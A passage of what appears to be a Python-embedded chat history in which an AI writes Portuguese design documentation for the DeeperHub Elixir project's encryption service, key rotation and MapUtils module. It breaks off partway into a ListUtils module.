    *   Ponto de entrada para todas as operações de criptografia, descriptografia e gerenciamento básico de chaves.
    *   Delega para o `EncryptionEngine` e o `KeyManagementService`.
2.  **`DeeperHub.Encryption.Engine` (Módulo Funcional ou Serviço):**
    *   **Responsabilidade:** Contém a lógica de baixo nível para realizar as operações criptográficas (criptografar/descriptografar) usando algoritmos específicos (ex: AES-GCM).
    *   Obtém a chave apropriada do `KeyManagementService`.
    *   Utiliza o módulo `:crypto` do Erlang/Elixir.
3.  **`DeeperHub.Encryption.KeyManagementService` (GenServer):**
    *   **Responsabilidade:** Gerencia o ciclo de vida das chaves de criptografia.
    *   **Estado Interno:** Chave de criptografia ativa, conjunto de chaves antigas (para descriptografia), metadados das chaves, próxima data de rotação.
    *   **Armazenamento de Chaves:** A forma como as chaves são *realmente* armazenadas de forma segura é crítica:
        *   **Ideal:** HSM ou KMS de nuvem. O `KeyManagementService` interagiria com o SDK/API desses serviços.
        *   **Bom:** Chaves de dados criptografadas por uma Chave de Criptografia de Chave (KEK) ou Chave Mestra, que por sua vez é protegida (ex: variável de ambiente segura, entrada manual no boot, HashiCorp Vault).
        *   **Básico (para desenvolvimento):** Chave(s) em arquivo de configuração protegido ou variável de ambiente.
    *   **Interações:** `EncryptionEngine` solicita chaves. `RotationWorker` aciona rotação.
4.  **`DeeperHub.Encryption.Workers.KeyRotationWorker` (GenServer):**
    *   **Responsabilidade:** Executar a rotação de chaves de forma programada e, opcionalmente, iniciar o processo de recriptografia de dados em background.
5.  **`DeeperHub.Shared.Encryption.EncryptedType` (Ecto.Type):**
    *   Tipo customizado para Ecto que chama `EncryptionService.encrypt_for_storage` e `decrypt_from_storage` automaticamente.
6.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   Algoritmo de criptografia padrão, tamanho da chave.
    *   Política de rotação de chaves (frequência).
    *   Configurações para o `KeyManagementService` (ex: tipo de storage de chave, path para chave mestra).

### 3.2. Estrutura de Diretórios (Proposta para `DeeperHub.Encryption`)

```
lib/deeper_hub/core/encryption_service.ex  # Fachada Pública

lib/deeper_hub/encryption/                # Lógica interna de criptografia
├── engine.ex                           # Lógica de cripto/descripto
├── key_management_service.ex           # GenServer para gerenciar chaves
│
├── workers/
│   └── key_rotation_worker.ex
│
├── storage_adapters/                   # Para armazenamento seguro de chaves (se não usar KMS externo)
│   ├── kms_adapter.ex
│   └── file_key_storage.ex
│
├── supervisor.ex
└── telemetry.ex
```
O `DeeperHub.Shared.Encryption.EncryptedType` permaneceria em `shared/encryption/`.

### 3.3. Decisões de Design Importantes

*   **Algoritmo de Criptografia:** Escolher um algoritmo simétrico forte e autenticado como AES-256-GCM é recomendado.
*   **Gerenciamento de IV/Nonce:** Para modos como GCM ou CBC, um IV/Nonce único e imprevisível deve ser gerado para cada operação de criptografia e armazenado junto com o ciphertext.
*   **Autenticação de Criptografia (AEAD):** Modos como GCM fornecem criptografia autenticada com dados associados (AEAD), que garante tanto a confidencialidade quanto a integridade/autenticidade dos dados. O \"contexto\" passado para as funções de encrypt/decrypt pode ser usado como AAD.
*   **Segurança das Chaves:** A segurança de todo o sistema de criptografia depende da segurança das chaves de criptografia. Esta é a parte mais crítica.
*   **Rotação de Chaves:** A rotação regular de chaves é uma prática de segurança importante. O sistema deve suportar a descriptografia de dados com chaves antigas enquanto criptografa novos dados com a chave atual.
*   **Recriptografia:** Após a rotação de chaves, os dados criptografados com chaves antigas devem ser gradualmente recriptografados com a nova chave (processo de background).

## 🛠️ 4. Casos de Uso Principais

*   **Armazenar Senha de API de Terceiros:**
    *   Um módulo de integração precisa armazenar uma API key para um serviço externo.
    *   Chama `EncryptionService.encrypt_for_storage(api_key_string, %{service_name: \"Stripe\", context: \"api_key\"})`.
    *   O resultado criptografado é salvo no banco de dados.
*   **Proteger PII em um Schema Ecto:**
    *   O `UserSchema` tem um campo `field :social_security_number, DeeperHub.Shared.Encryption.EncryptedType`.
    *   Quando um usuário é salvo, o `EncryptedType` automaticamente chama `EncryptionService.encrypt_for_storage` no valor do CPF.
    *   Quando o usuário é lido, o `EncryptedType` chama `EncryptionService.decrypt_from_storage`.
*   **Rotação de Chave Agendada:**
    *   `KeyRotationWorker` é acionado.
    *   Chama `KeyManagementService.rotate_key()`.
    *   `KeyManagementService` gera uma nova chave, define-a como ativa, e move a antiga para a lista de chaves de descriptografia.
    *   (Opcional) `KeyRotationWorker` inicia um processo em background para recriptografar dados antigos.

## 🌊 5. Fluxos Importantes

### Fluxo de Criptografia (`encrypt_for_storage/2`)

1.  **Chamador (ex: `EncryptedType` ou serviço):** Chama `DeeperHub.Core.EncryptionService.encrypt_for_storage(plain_value, context_map)`.
2.  **`Core.EncryptionService` (Fachada):** Delega para `Encryption.Engine.encrypt`.
3.  **`Encryption.Engine.encrypt`:**
    *   Solicita a chave de criptografia ativa (ID e material da chave) do `Encryption.KeyManagementService.get_current_key()`.
    *   Gera um IV/Nonce único.
    *   Usa o módulo `:crypto.block_encrypt(algorithm, key, iv, plaintext_padded, %{aad: serialized_context})` (para AES-GCM, a API é um pouco diferente, ex: `:crypto.crypto_one_time_aead/6`).
    *   Obtém o ciphertext e a tag de autenticação.
    *   Formata a saída incluindo o ID da chave, IV, tag e ciphertext (ex: um mapa ou uma string prefixada).
    *   Retorna `{:ok, encrypted_blob}`.

### Fluxo de Rotação de Chave e Recriptografia (Simplificado)

1.  **`KeyRotationWorker`:** Acionado por agendamento.
2.  Chama `DeeperHub.Encryption.KeyManagementService.rotate_key()`.
3.  **`KeyManagementService`:**
    *   Gera uma nova chave (`new_key_material`, `new_key_id`).
    *   Define `new_key_id` como a chave ativa.
    *   Move a chave ativa anterior para uma lista de chaves \"antigas\" (ainda válidas para descriptografia).
    *   (Opcional) Revoga/descarta chaves muito antigas que não são mais necessárias.
    *   Persiste o novo estado das chaves de forma segura.
    *   Retorna `{:ok, %{new_key_id: ..., old_active_key_id: ...}}`.
4.  **`KeyRotationWorker`:**
    *   Inicia um processo em background (ex: uma tarefa para o `Core.BackgroundTaskManager`) para recriptografar dados.
    *   A tarefa de recriptografia irá:
        *   Iterar sobre os dados que precisam ser recriptografados (ex: todas as linhas em tabelas com campos criptografados).
        *   Para cada dado:
            *   Chamar `Core.EncryptionService.decrypt(encrypted_data_with_old_key)`.
            *   Chamar `Core.EncryptionService.encrypt(decrypted_data_with_new_key)`.
            *   Atualizar o registro no banco de dados com o novo dado criptografado.
        *   Isso deve ser feito em lotes e de forma a minimizar o impacto no desempenho.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Core.EncryptionService`)

### 6.1. `DeeperHub.Core.EncryptionService.encrypt(data :: binary() | String.t(), context :: map() | nil) :: {:ok, EncryptedOutput.t()} | {:error, term()}`

*   **Descrição:** Criptografa dados genéricos.
*   **`context`:** Dados associados adicionais (AAD) para modos AEAD como AES-GCM. Garante que os dados só possam ser descriptografados no mesmo contexto.
*   **`EncryptedOutput.t()`:** Um mapa ou string que contém o ciphertext, ID da chave usada, IV/nonce, e tag de autenticação. Ex: `%{key_id: \"id\", iv: <<...>>, tag: <<...>>, ciphertext: <<...>>, algorithm: :aes_256_gcm}`.

### 6.2. `DeeperHub.Core.EncryptionService.decrypt(encrypted_output :: EncryptedOutput.t(), context :: map() | nil) :: {:ok, binary() | String.t()} | {:error, :decryption_failed | :integrity_check_failed | :key_not_found | term()}`

*   **Descrição:** Descriptografa dados previamente criptografados por `encrypt/2`.
*   **`context`:** Deve ser o mesmo contexto usado durante a criptografia.

### 6.3. `DeeperHub.Core.EncryptionService.encrypt_for_storage(value :: term(), context :: map() | nil) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Criptografa um valor (que pode ser qualquer termo Elixir serializável) para armazenamento em banco de dados. Retorna uma string única que contém todos os metadados necessários para descriptografia.
*   **Formato da String de Saída (Exemplo):** `\"ENCV1:AES256GCM:<key_id>:<base64_iv>:<base64_tag>:<base64_ciphertext>\"`
*   O `context` pode ser usado como AAD.

### 6.4. `DeeperHub.Core.EncryptionService.decrypt_from_storage(encrypted_string :: String.t(), context :: map() | nil) :: {:ok, term()} | {:error, term()}`

*   **Descrição:** Descriptografa uma string previamente criptografada por `encrypt_for_storage/2`.

### 6.5. `DeeperHub.Core.EncryptionService.rotate_keys(opts :: keyword()) :: {:ok, %{new_key_id: String.t(), old_key_id: String.t()}} | {:error, term()}`

*   **Descrição:** Força uma rotação da chave de criptografia ativa.
*   **`opts`:** Pode incluir `:trigger_re_encryption_job` (boolean).

### 6.6. `DeeperHub.Core.EncryptionService.re_encrypt_data_batch(query_function :: (() -> list(Ecto.Schema.t())), update_function :: ((Ecto.Schema.t(), map_of_reencrypted_fields) -> :ok | {:error, term()}), fields_to_re_encrypt :: list(atom()), opts :: keyword()) :: {:ok, %{processed: integer(), failed: integer()}}` (Nova Sugestão)

*   **Descrição:** Função de alto nível para ajudar no processo de recriptografia em lote.
*   **`query_function`:** Função que retorna um lote de registros para recriptografar.
*   **`update_function`:** Função que recebe o registro original e um mapa de campos recriptografados e os salva.
*   **`fields_to_re_encrypt`:** Lista dos campos na struct que usam `EncryptedType`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :encryption, :enabled]`** (Boolean): Habilita/desabilita a criptografia. (Padrão: `true`)
*   **`[:core, :encryption, :default_algorithm]`** (Atom): Algoritmo simétrico padrão (ex: `:aes_256_gcm`).
*   **`[:core, :encryption, :key_management, :provider]`** (Module): Adaptador para o provedor de gerenciamento de chaves (ex: `DeeperHub.Encryption.StorageAdapters.KMSAdapter`, `DeeperHub.Encryption.StorageAdapters.FileKeyStorage`).
*   **`[:core, :encryption, :key_management, :file_storage_path]`** (String): Caminho para o arquivo de chaves se `FileKeyStorage` for usado.
*   **`[:core, :encryption, :key_management, :master_key_env_var]`** (String): Nome da variável de ambiente que contém a chave mestra (KEK) se as chaves de dados forem criptografadas em repouso por ela.
*   **`[:core, :encryption, :key_management, :key_rotation_days]`** (Integer): Frequência de rotação de chaves em dias. (Padrão: `90`)
*   **`[:core, :encryption, :key_management, :old_keys_to_keep_for_decryption]`** (Integer): Número de chaves antigas a serem mantidas para descriptografia. (Padrão: `2`)
*   **`[:core, :encryption, :at_rest_encryption_prefix]`** (String): Prefixo usado para strings criptografadas para armazenamento. (Padrão: `\"ENCV1:\"`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para métricas.
*   `DeeperHub.Core.BackgroundTaskManager`: Para jobs de recriptografia.
*   `DeeperHub.Audit`: Para auditar eventos de gerenciamento de chaves.

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP): Para as operações criptográficas de baixo nível.
*   Bibliotecas cliente para KMS de nuvem (ex: `ExAws.KMS`), se usadas.
*   `Ecto` (para `EncryptedType`).

## 🤝 9. Como Usar / Integração

*   **Schemas Ecto:** Usar `DeeperHub.Shared.Encryption.EncryptedType` para campos que precisam ser criptografados em repouso.
    ```elixir
    defmodule DeeperHub.Accounts.Schema.User do
      use Ecto.Schema
      alias DeeperHub.Shared.Encryption.EncryptedType

      schema \"users\" do
        field :email, :string
        field :social_security_number, EncryptedType # Será criptografado
        field :api_token_for_service_x, EncryptedType # Outro exemplo
        # ...
      end
    end
    ```
*   **Serviços que Armazenam Segredos:** Chamar `EncryptionService.encrypt_for_storage/2` antes de salvar e `decrypt_from_storage/2` após ler.
    ```elixir
    def store_external_api_key(user_id, service_name, api_key) do
      context = %{user_id: user_id, service: service_name}
      {:ok, encrypted_key} = DeeperHub.Core.EncryptionService.encrypt_for_storage(api_key, context)
      # ... salvar encrypted_key no banco de dados ...
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar as funções de encrypt/decrypt com diferentes dados e contextos.
*   Testar o tipo Ecto `EncryptedType` para garantir que ele criptografa/descriptografa corretamente durante as operações de `Repo`.
*   Testar o ciclo de vida das chaves: geração, rotação, uso de chaves antigas para descriptografar.
*   Testar a recriptografia de dados.
*   Verificar se os metadados corretos (key_id, iv) são armazenados e usados.
*   Localização: `test/deeper_hub/core/encryption_service/` e `test/deeper_hub/encryption/`.

### 10.2. Métricas

*   `deeper_hub.core.encryption.encrypt.count` (tags: `algorithm`, `context_type`)
*   `deeper_hub.core.encryption.decrypt.count` (tags: `algorithm`, `key_id_used`, `status` (`success`, `failure`))
*   `deeper_hub.core.encryption.encrypt.duration_ms` (Histograma)
*   `deeper_hub.core.encryption.decrypt.duration_ms` (Histograma)
*   `deeper_hub.encryption.keys.rotated.count`
*   `deeper_hub.encryption.keys.active.info` (Gauge, com tags para `key_id`, `creation_date`)
*   `deeper_hub.encryption.data_re_encrypted.count` (Contador)

### 10.3. Logs

*   **Nível INFO:** Chave rotacionada com sucesso. Início e fim de job de recriptografia.
*   **Nível WARNING:** Tentativa de descriptografar dados com uma chave não encontrada (mas pode ser uma chave antiga que deveria estar disponível). Falha na verificação de integridade da tag de autenticação.
*   **Nível ERROR/CRITICAL:** Falha ao carregar a chave mestra. Falha ao gerar uma nova chave de dados. Erro irrecuperável durante criptografia/descriptografia. Chave ativa não encontrada.

### 10.4. Telemetria

*   `[:deeper_hub, :core, :encryption, :encrypt, :start | :stop | :exception]`
    *   Metadados: `%{data_size_bytes: size, context_present: boolean, key_id_used: id}`
*   `[:deeper_hub, :core, :encryption, :decrypt, :start | :stop | :exception]`
    *   Metadados: `%{key_id_from_blob: id, context_present: boolean, result: :success | :failure}`
*   `[:deeper_hub, :encryption, :key_management, :key_rotated]`
    *   Metadados: `%{new_key_id: id, old_key_id: id, trigger: :manual | :scheduled}`
*   `[:deeper_hub, :encryption, :key_management, :key_generated]`
    *   Metadados: `%{key_id: id}`

## ❌ 11. Tratamento de Erros

*   **Falha na Descriptografia:** Deve retornar um erro claro (ex: `:decryption_failed`, `:integrity_check_failed`). A aplicação chamadora deve lidar com isso (ex: impedir acesso ao dado, solicitar re-entrada se for algo como uma configuração).
*   **Chave Não Encontrada:** Se uma `key_id` referenciada em dados criptografados não for encontrada pelo `KeyManagementService`, a descriptografia falhará. Isso pode indicar um problema sério de gerenciamento de chaves ou corrupção de dados.
*   **Falha na Geração/Rotação de Chave:** São eventos críticos que devem ser alertados imediatamente.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **SEGURANÇA DAS CHAVES É PARAMOUNT:** A segurança de todo o sistema de criptografia repousa na segurança das chaves de criptografia de dados (DEKs) e, mais importante, da chave mestra (KEK) se usada para criptografá-las.
    *   A KEK NUNCA deve ser commitada no código. Deve vir de uma variável de ambiente segura, um cofre de segredos (Vault), ou um KMS/HSM.
    *   Limite o acesso ao `KeyManagementService` e às suas operações de rotação/geração.
*   **Escolha de Algoritmos:** Usar algoritmos padrão da indústria, fortes e com modos de operação seguros (ex: AES-256-GCM). Evitar algoritmos obsoletos ou implementações customizadas.
*   **IVs/Nonces:** Devem ser únicos para cada criptografia com a mesma chave. Não reutilizar IVs.
*   **AAD (Additional Authenticated Data):** Usar AAD (contexto) corretamente com modos AEAD como GCM pode prevenir certos tipos de ataques onde o ciphertext é movido para um contexto diferente.

## 🧑‍💻 13. Contribuição

*   Qualquer alteração na lógica de criptografia ou gerenciamento de chaves deve ser revisada por alguém com experiência em segurança e criptografia.
*   Seja extremamente cuidadoso ao lidar com o material da chave.
*   Novos campos sensíveis na aplicação devem usar o `EncryptedType` ou as funções de `encrypt_for_storage`.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Integrar com um HSM ou KMS de nuvem para o armazenamento e operações com chaves de mais alto nível.
*   [ ] Implementar \"Envelope Encryption\" de forma mais explícita se usando KMS de nuvem.
*   [ ] Adicionar suporte para criptografia assimétrica (chave pública/privada) se houver casos de uso (ex: compartilhar dados criptografados com terceiros de forma segura).
*   [ ] Desenvolver uma política de \"destruição criptográfica\" para dados que precisam ser permanentemente irrecuperáveis (destruindo a chave de criptografia associada).
*   [ ] Automatizar e robustecer o processo de recriptografia de dados em segundo plano para grandes volumes de dados, com monitoramento de progresso e tratamento de falhas.

---

*Última atualização: 2025-05-12*

---

Criptografia e gerenciamento de chaves são complexos, mas essenciais!

Temos agora uma boa base de módulos Core e de Segurança. Onde gostaria de ir agora?
Podemos detalhar os submódulos dos `Shared.Utils` (`MapUtils`, `ListUtils`, `ValidationUtils`, `FileUtils`, `SecurityUtils`), ou talvez um módulo de domínio como `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, dado que `DeeperHub.Shared.Utils` é um agrupador, vamos detalhar um de seus componentes que é frequentemente usado em toda a aplicação: `DeeperHub.Shared.Utils.MapUtils`.

---

# Módulo: `DeeperHub.Shared.Utils.MapUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.MapUtils`

O módulo `DeeperHub.Shared.Utils.MapUtils` fornece um conjunto de **funções utilitárias para manipulação e transformação de mapas (maps)** e, por extensão, de structs Elixir (que são baseados em mapas). Estas funções são projetadas para simplificar operações comuns em mapas, como conversão de tipos de chave, mesclagem profunda, filtragem de entradas, e acesso seguro a valores aninhados.

Sendo um módulo puramente funcional, ele não gerencia estado e suas funções visam ser robustas e reutilizáveis em diversas partes do sistema DeeperHub. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Conversão de Tipos de Chave:**
    *   Converter chaves de átomo para string em um mapa (`atom_keys_to_strings/2`).
    *   Converter chaves de string para átomo em um mapa (`string_keys_to_atoms/2`).
    *   Suporte para conversão recursiva em mapas aninhados.
*   **Manipulação de Valores `nil`:**
    *   Remover todas as chaves de um mapa cujos valores são `nil` (`compact/2`), opcionalmente de forma recursiva.
*   **Mesclagem de Mapas:**
    *   Mesclar dois mapas recursivamente (`deep_merge/2`), onde as chaves do segundo mapa têm precedência em caso de conflito.
*   **Filtragem de Entradas:**
    *   Filtrar as entradas de um mapa com base em uma função predicado que opera sobre a chave e/o valor (`filter_map/2`).
*   **Acesso a Dados Aninhados:**
    *   Obter um valor de um caminho de chaves aninhadas dentro de um mapa, com um valor padrão se o caminho não existir (`get_in_path/3`).
    *   Atualizar um valor em um caminho de chaves aninhadas dentro de um mapa (`update_in_path/3`).
*   **Transformação de Valores:**
    *   Aplicar uma função a todos os valores de um mapa, opcionalmente de forma recursiva (`map_values/3`).
*   **Conversão de Estrutura:**
    *   Converter um mapa em uma lista de mapas chave-valor (`to_key_value_list/3`).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.MapUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade para mapas.
    *   Utiliza principalmente funções dos módulos `Map`, `Enum` e `Kernel` do Elixir.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/map_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Imutabilidade:** Todas as funções retornam novos mapas, não modificando os mapas de entrada.
*   **Tratamento de Entradas:** Funções devem lidar de forma previsível com diferentes tipos de entrada (ex: mapas vazios, chaves não existentes).
*   **Recursividade Opcional:** Para funções como conversão de chaves ou compactação, a opção de aplicar a transformação recursivamente a mapas aninhados é importante.
*   **Clareza e Previsibilidade:** As funções devem ter um comportamento claro e bem documentado.

## 🛠️ 4. Casos de Uso Principais

*   **Preparar Dados para API JSON:**
    *   Antes de serializar um struct Elixir (com chaves de átomo) para JSON, usar `MapUtils.atom_keys_to_strings(data, true)` para converter todas as chaves para strings.
*   **Limpar Parâmetros de Requisição:**
    *   Receber `params` de uma requisição web e usar `MapUtils.compact(params)` para remover quaisquer chaves com valores `nil` antes de passá-los para um serviço.
*   **Configuração de Mesclagem:**
    *   Mesclar configurações padrão com configurações específicas do usuário: `MapUtils.deep_merge(default_config, user_config)`.
*   **Extrair Configurações Específicas:**
    *   De um grande mapa de configuração, extrair apenas as configurações relevantes: `MapUtils.filter_map(all_configs, fn key, _value -> String.starts_with?(Atom.to_string(key), \"email_\") end)`.
*   **Acessar Preferência Aninhada:**
    *   `MapUtils.get_in_path(user_settings, [:notifications, :email, :marketing_opt_in], false)`.

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado. O fluxo é a execução da função com os dados de entrada e o retorno do mapa transformado.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original e mantendo a consistência)*

### 6.1. `DeeperHub.Shared.Utils.MapUtils.atom_keys_to_strings(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descrição:** Converte todas as chaves de átomo em `map_data` para strings.
*   **`recursive`:** Se `true`, aplica a conversão a todos os mapas aninhados.

### 6.2. `DeeperHub.Shared.Utils.MapUtils.string_keys_to_atoms(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descrição:** Converte todas as chaves de string em `map_data` para átomos.
*   **`recursive`:** Se `true`, aplica a conversão a todos os mapas aninhados.
*   **Cuidado:** Usar com cautela, pois a criação excessiva de átomos pode levar ao esgotamento da tabela de átomos do Erlang. Preferível para chaves conhecidas.

### 6.3. `DeeperHub.Shared.Utils.MapUtils.compact(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descrição:** Remove todas as chaves de `map_data` cujos valores são `nil`.
*   **`recursive`:** Se `true`, aplica a compactação a todos os mapas aninhados.

### 6.4. `DeeperHub.Shared.Utils.MapUtils.deep_merge(map1 :: map(), map2 :: map()) :: map()`

*   **Descrição:** Mescla `map2` em `map1`. Se uma chave existir em ambos, o valor de `map2` é usado. Se os valores para uma chave comum forem ambos mapas, eles são mesclados recursivamente.
*   **Exemplo:**
    ```elixir
    map_a = %{a: 1, b: %{c: 2, d: 3}}
    map_b = %{b: %{d: 4, e: 5}, f: 6}
    MapUtils.deep_merge(map_a, map_b)
    #=> %{a: 1, b: %{c: 2, d: 4, e: 5}, f: 6}
    ```

### 6.5. `DeeperHub.Shared.Utils.MapUtils.filter_map(map_data :: map(), predicate_fun :: ((key :: term(), value :: term()) -> boolean())) :: map()`

*   **Descrição:** Retorna um novo mapa contendo apenas as entradas de `map_data` para as quais `predicate_fun` retorna `true`.

### 6.6. `DeeperHub.Shared.Utils.MapUtils.get_in_path(map_data :: map(), path :: list(atom() | String.t()), default_value :: term() \\\\ nil) :: term()`

*   **Descrição:** Acessa um valor aninhado em `map_data` usando uma `path` (lista de chaves). Retorna `default_value` se qualquer parte do caminho não existir. (Similar a `get_in/2` do Kernel, mas com um `default_value` explícito e talvez mais flexibilidade nos tipos de chave no path).

### 6.7. `DeeperHub.Shared.Utils.MapUtils.update_in_path(map_data :: map(), path :: list(atom() | String.t()), new_value :: term()) :: map()`

*   **Descrição:** Atualiza um valor em um caminho aninhado. Se o caminho não existir completamente, ele pode ser criado (dependendo da implementação exata, ou pode falhar). (Similar a `put_in/3` ou `update_in/3` do Kernel).

### 6.8. `DeeperHub.Shared.Utils.MapUtils.map_values(map_data :: map(), transform_fun :: ((value :: term()) -> term()), recursive :: boolean() \\\\ false) :: map()`

*   **Descrição:** Cria um novo mapa aplicando `transform_fun` a cada valor do `map_data` original.
*   **`recursive`:** Se `true`, e um valor for um mapa, aplica `map_values` a esse mapa aninhado.

### 6.9. `DeeperHub.Shared.Utils.MapUtils.to_key_value_list(map_data :: map(), key_field_name :: atom() \\\\ :key, value_field_name :: atom() \\\\ :value) :: list(map())`

*   **Descrição:** Converte um mapa em uma lista de mapas, onde cada mapa na lista tem duas chaves: `key_field_name` (contendo a chave original) e `value_field_name` (contendo o valor original).
*   **Exemplo:**
    ```elixir
    MapUtils.to_key_value_list(%{name: \"Alice\", age: 30})
    #=> [%{key: :name, value: \"Alice\"}, %{key: :age, value: 30}]
    ```

## ⚙️ 7. Configuração

Este módulo, sendo puramente funcional e genérico, geralmente não requer configurações externas. Comportamentos padrão (ex: para `compact` recursivo) são definidos por argumentos de função.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Utiliza principalmente os módulos `Map` e `Enum` do Elixir padrão.

## 🤝 9. Como Usar / Integração

Importar ou usar alias e chamar as funções diretamente.

```elixir
alias DeeperHub.Shared.Utils.MapUtils

def process_user_input(params) do
  string_keyed_params = MapUtils.atom_keys_to_strings(params)
  compacted_params = MapUtils.compact(string_keyed_params, true)
  # ...
end

def get_notification_setting(user_prefs, type, channel) do
  MapUtils.get_in_path(user_prefs, [:notifications, type, channel], true) # Default to true
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários extensivos para cada função, cobrindo:
    *   Mapas vazios.
    *   Mapas com diferentes tipos de chaves e valores.
    *   Comportamento recursivo vs. não recursivo.
    *   Casos de borda (ex: `get_in_path` com caminho parcialmente existente).
    *   Tratamento de `nil` como entrada.
*   Localização: `test/deeper_hub/shared/utils/map_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Não aplicável para um módulo de utilitários puros. A instrumentação ocorreria nos módulos que utilizam essas funções, se uma chamada específica a uma função de `MapUtils` se mostrar um gargalo.

## ❌ 11. Tratamento de Erros

*   Funções devem ser claras sobre como lidam com entradas inválidas (ex: passar uma lista para uma função que espera um mapa). Geralmente, devem levantar `ArgumentError` ou `FunctionClauseError`.
*   `string_keys_to_atoms` deve ser usado com cautela, pois a criação desenfreada de átomos pode levar ao esgotamento da tabela de átomos. Idealmente, usar apenas para um conjunto conhecido de chaves string.

## 🛡️ 12. Considerações de Segurança

*   Geralmente baixo risco de segurança direto, pois são funções de manipulação de dados.
*   A segurança se torna relevante no contexto de como os mapas resultantes são usados (ex: se um mapa com chaves de átomo convertidas de strings de usuário for usado em `apply/3` de forma insegura, mas isso é um problema do chamador, não do `MapUtils`).

## 🧑‍💻 13. Contribuição

*   Adicione novas funções apenas se forem utilidades de mapa genéricas e amplamente aplicáveis.
*   Mantenha a pureza funcional e a imutabilidade.
*   Documente claramente o comportamento, especialmente para casos de borda e tratamento de `nil`.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar `deep_atomize_keys/1` e `deep_stringify_keys/1` como atalhos para as versões recursivas.
*   [ ] Considerar funções para transformações mais complexas, como `rename_keys/2` ou `transform_keys_and_values/2`.
*   [ ] Otimizar funções para performance em mapas muito grandes, se necessário, embora as implementações baseadas em `Enum` e `Map` do Elixir já sejam bastante eficientes.

---

*Última atualização: 2025-05-12*

---

Utilitários de mapa são sempre bem-vindos para manter o código limpo!

Próximo? Podemos fazer `DeeperHub.Shared.Utils.ListUtils` ou `ValidationUtils` para continuar com os utilitários, ou saltar para um módulo de domínio ou outro Core?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ótimo! Vamos continuar com os utilitários e detalhar o `DeeperHub.Shared.Utils.ListUtils`. Manipular listas é uma tarefa onipresente em Elixir.

---

# Módulo: `DeeperHub.Shared.Utils.ListUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.ListUtils`

O módulo `DeeperHub.Shared.Utils.ListUtils` agrupa um conjunto de **funções utilitárias para manipulação e processamento de listas**. Sendo o Elixir uma linguagem funcional que faz uso extensivo de listas, este módulo visa fornecer helpers para operações comuns que podem não estar diretamente disponíveis no módulo `Enum` ou `List` padrão, ou para encapsular combinações comuns dessas funções de forma mais expressiva.

Estas funções são projetadas para serem genéricas, puras e eficientes, auxiliando em tarefas como divisão de listas, comparação, agrupamento, ordenação complexa e garantia de unicidade. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Divisão de Listas:**
    *   Dividir uma lista em sub-listas (chunks) de um tamanho específico (`chunk/2`).
    *   Particionar uma lista em duas com base em uma função predicado (`partition/2`).
*   **Comparação de Listas:**
    *   Calcular a diferença entre duas listas, opcionalmente usando uma função de chave para comparação de elementos (`diff/3`).
*   **Agrupamento de Elementos:**
    *   Agrupar elementos de uma lista com base no resultado de uma função de chave (`group_by/2`).
*   **Combinação de Listas:**
    *   Intercalar os elementos de duas listas (`interleave/2`).
*   **Paginação em Memória:**
    *   Simular paginação em uma lista, retornando uma fatia específica e metadados de paginação (`paginate/3`).
*   **Ordenação Avançada:**
    *   Ordenar uma lista de mapas ou structs com base em múltiplas chaves de ordenação, cada uma com sua própria direção (ascendente/descendente) (`sort_by_keys/2`).
*   **Garantia de Unicidade:**
    *   Remover elementos duplicados de uma lista, opcionalmente usando uma função de chave para determinar a unicidade (`unique/2`).
*   **Outras Operações Comuns:**
    *   (Potencialmente) Flattening de listas aninhadas, amostragem, rotação, etc.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.ListUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade para listas.
    *   Utiliza extensivamente os módulos `Enum` e `List` do Elixir como base para suas implementações.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/list_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Imutabilidade:** Todas as funções operam sobre listas e retornam novas listas, sem modificar as listas de entrada.
*   **Lazy Evaluation vs. Eager Evaluation:** Para operações em listas potencialmente muito grandes, considerar se uma implementação lazy (usando `Stream`) seria mais apropriada para algumas funções, embora a maioria dos utilitários tende a ser eager.
*   **Consistência com API `Enum` e `List`:** Onde possível, manter a semântica e os nomes de argumentos consistentes com as funções padrão do Elixir.
*   **Performance:** Para operações que podem ser custosas (ex: ordenação complexa, diff em listas grandes), considerar a eficiência algorítmica.

## 🛠️ 4. Casos de Uso Principais

*   **Exibir Itens em Lotes:**
